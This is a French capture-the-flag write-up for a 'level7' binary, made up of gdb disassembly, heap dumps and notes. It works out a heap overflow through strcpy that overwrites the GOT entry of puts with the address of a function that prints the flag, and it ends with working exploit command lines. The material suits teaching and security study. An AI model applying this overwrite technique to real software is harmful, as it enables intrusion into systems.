./level7 -> segfault
./level7 test -> segfault
./level7 test test2 -> ~~

disas main :
   0x08048521 <+0>:	    push   %ebp
   0x08048522 <+1>: 	mov    %esp,%ebp
   0x08048524 <+3>:	    and    $0xfffffff0,%esp
   0x08048527 <+6>:	    sub    $0x20,%esp
   0x0804852a <+9>:	    movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax => x $eax 0x804a018:	0x41 -> copy dans une adresse malloc
                                                dans la heap (cf dessous 1)
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx => cf 2 en dessous
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp) => x 0x8049960 : 0x8049960 <c>:	0x00 : variable globale
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt> => lire le fichier ouvert avec fopen dans c
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret 

1 : x/100x 0x804a008 => copy dans s1[4]
0x804a008:	0x01	0x00	0x00	0x00	0x18	0xa0	0x04	0x08
0x804a010:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a018:	0x41	0x41	0x41	0x41	0x00	0x00	0x00	0x00
0x804a020:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a028:	0x02	0x00	0x00	0x00	0x38	0xa0	0x04	0x08
0x804a030:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a040:	0x00	0x00	0x00	0x00	0xc1	0x0f	0x02	0x00
0x804a048:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a050:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a058:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a060:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a068:	0x00	0x00	0x00	0x00

2 : x/100x 0x804a008 => copy dans s2[4]
0x804a008:	0x01	0x00	0x00	0x00	0x18	0xa0	0x04	0x08
0x804a010:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a018:	0x41	0x41	0x41	0x41	0x00	0x00	0x00	0x00
0x804a020:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a028:	0x02	0x00	0x00	0x00	0x38	0xa0	0x04	0x08
0x804a030:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a038:	0x31	0x31	0x31	0x31	0x00	0x00	0x00	0x00
0x804a040:	0x00	0x00	0x00	0x00	0xc1	0x0f	0x02	0x00
0x804a048:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a050:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a058:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a060:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a068:	0x00	0x00	0x00	0x00

disas m :
   0x080484f4 <+0>:	    push   %ebp
   0x080484f5 <+1>:	    mov    %esp,%ebp
   0x080484f7 <+3>:	    sub    $0x18,%esp
   0x080484fa <+6>:	    movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx => x 0x80486e0 : 0x80486e0:	 "%s - %d\n"
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp) => x 0x8049960 : 0x8049960 <c>:	 ""
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret  

On a donc un fgets qui lit et stocke le flag dans une variable globale, et une fonction m
qui lit cette variable mais qui n´est pas appelé. Notre objectif est donc de changer 
l´addresse du puts pour la remplacer par celle de m pour afficher le flag au lieu du "~~".

On va utiliser le premier strcpy pour stocker l´addresse du puts et le deuxieme pour y
ecrire l´addresse de m à la place.

Il faut qu´on trouve le bon padding a mettre avant notre address puts. On va lancer avec une string lamba pour reperer où on commence à 
overflow : 
r $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"+"\x28\x99\x04\x08"') $(python -c 'print "\f4\x84\x04\x08"')
   
Apres le segfault : 
   i r :
      eax            0x484340c	75772940
      ecx            0xbffff905	-1073743611
      edx            0x46464646	1179010630 -> on a un override ici qui correspond a notre FFFF
      ebx            0xb7fd0ff4	-1208152076
      esp            0xbffff6dc	0xbffff6dc
      ebp            0xbffff708	0xbffff708
      esi            0x0	0
      edi            0x0	0
      eip            0xb7eb8f62	0xb7eb8f62
      eflags         0x210246	[ PF ZF IF RF ID ]
      cs             0x73	115
      ss             0x7b	123
      ds             0x7b	123
      es             0x7b	123
      fs             0x0	0
      gs             0x33	51

On peut pas tester beaucoup plus dans gdb car le fgets segfault (manque de droit pour ouvrir
le .pass), on va donnc finir hors gdb.
./level7 $(python -c 'print "a"*24+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')

Il faut penser à enlever 4 charactere pour notre adresse :
./level7 $(python -c 'print "a"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')